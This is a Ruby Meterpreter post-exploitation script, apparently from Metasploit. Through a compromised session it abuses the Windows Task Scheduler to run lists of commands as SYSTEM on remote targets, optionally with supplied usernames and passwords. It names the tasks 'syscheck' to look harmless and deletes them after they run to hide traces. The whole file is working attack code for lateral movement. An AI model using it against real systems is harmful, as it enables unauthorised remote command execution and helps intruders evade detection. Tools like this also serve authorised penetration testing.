
#Meterpreter script for abusing the scheduler service in windows
#by scheduling and running a list of command against one or more targets
#using schtasks command to run them as system. This script works with Windows XP,
#Windows 2003, Windows Vista and Windows 2008.
#Verion: 0.1.1
#Note: in Vista UAC must be disabled to be able to perform scheduling
#and the meterpreter must be running under the profile of local admin
#or system.
################## Variable Declarations ##################
session = client
# Setting Arguments
@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu."                        ],
	"-c" => [ true,"Commands to execute. Several commands can be given but separated by commas and enclose the list in double quotes if arguments are used."],
	"-u" => [ true,"Username to schedule task, if none is given the current user credentials will be used."],
	"-p" => [ true,"Password for user account specified, it must be given if a user is given."],
	"-d" => [ true,"Delay between the execution of commands in seconds, default is 2 seconds if not given."],
	"-t" => [ true,"Remote system to schedule job."],
	"-l" => [ true,"Text file with list of targets, one per line."],
	"-s" => [ true,"Text file with list of commands, one per line."]
)
#Setting Argument variables
commands = []
targets = []
username = nil
password = nil
delay = 2
help = 0
def usage
	print_status( "This Meterpreter script is for running commands on targets system using the")
	print_status( "Windows Scheduler, it is based on the tool presented but not released by Val Smith")
	print_status( "in Defcon 16 ATAbuser. If no user and password is given it will use the permissions")
	print_status( "of the process Meterpreter is running under.")
	print_status( "Options:")
	print_status( @@exec_opts.usage )
end
def abuse(session,targets,commands,username,password,delay)
	#for each target
	targets.each do |t|
		next if t.strip.length < 1
		next if t[0,1] == "#"
		#for eacg command
		commands.each do |c|
			next if c.strip.length < 1
			next if c[0,1] == "#"
			taskname = "syscheck#{rand(100)}"
			success = false
			#check if user name and password where given, if not credential of running process used
			if username == nil && password == nil
				print_status("Scheduling command #{c} to run .....")
				execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{c}\"  /sc once /ru system /s #{t} /st 00:00:00"
				r = session.sys.process.execute("cmd.exe /c #{execmd}", nil, {'Hidden' => 'true','Channelized' => true})
				#check if successfully scheduled
				while(d = r.channel.read)
					if d =~ /successfully been created/
						print_status("The scheduled task has been successfully created")
						success = true
					end
				end
				#check if schedule successful, if not raise error
				if !success
					print_status("Failed to create scheduled task!!")
					raise "Command could not be Scheduled"
				elsif success
					print_status("Running command on #{t}")
					session.sys.process.execute("cmd.exe /c schtasks /run /tn #{taskname} /s #{t}")
				end
				r.channel.close
				r.close
				#Wait before scheduling next command
				sleep(delay)
				print_status("Removing scheduled task")
				session.sys.process.execute("cmd.exe /c schtasks /delete /tn #{taskname} /s #{t} /F")
			else
				print_status("Scheduling command #{c} to run .....")
				execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{c}\"  /sc once /ru system /s #{t} /u #{username} /p #{password} /st 00:00:00"
				r = session.sys.process.execute("cmd.exe /c #{execmd}", nil, {'Hidden' => 'true','Channelized' => true})
				#check if successfully scheduled
				while(d = r.channel.read)
					if d =~ /successfully been created/
						print_status("The scheduled task has been successfully created")
						success = true
					end
				end
				#check if schedule successful, if not raise error
				if !success
					print_status("Failed to create scheduled task!!")
					raise "Command could not be Scheduled"
				elsif success
					print_status("Running command on #{t}")
					session.sys.process.execute("cmd.exe /c schtasks /run /tn #{taskname} /s #{t} /u #{username} /p #{password}")
				end
				r.channel.close
				r.close
				#Wait before scheduling next command
				sleep(delay)
				print_status("Removing scheduled task")
				session.sys.process.execute("cmd.exe /c schtasks /delete /tn #{taskname} /s #{t}  /u #{username} /p #{password} /F")
			end
		end
	end
end

#check for proper Meterpreter Platform
def unsupported
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end


@@exec_opts.parse(args) { |opt, idx, val|
	case opt

	when "-c"
		commands = val.split(',')
	when "-u"
		username = val
	when "-p"
		password = val
	when "-t"
		targets = val.split(',')
	when "-d"
		delay = val.to_i
	when "-s"
		script = val
		if not ::File.exists?(script)
			raise "Command List File does not exists!"
		else
			::File.open(script, "r").each_line do |line|
				commands << line.chomp
			end
		end
	when "-l"
		list = val
		if not ::File.exists?(list)
			raise "Command List File does not exists!"
		else
			::File.open(list, "r").each_line do |line|
				targets << line.chomp
			end
		end
	when "-h"
		help = 1
	end

}

unsupported if client.platform !~ /win32|win64/i
print_status("Meterpreter session running as #{session.sys.config.getuid}")
if help == 0 && commands.length != 0
	abuse(session,targets,commands,username,password,delay)
else
	usage
end
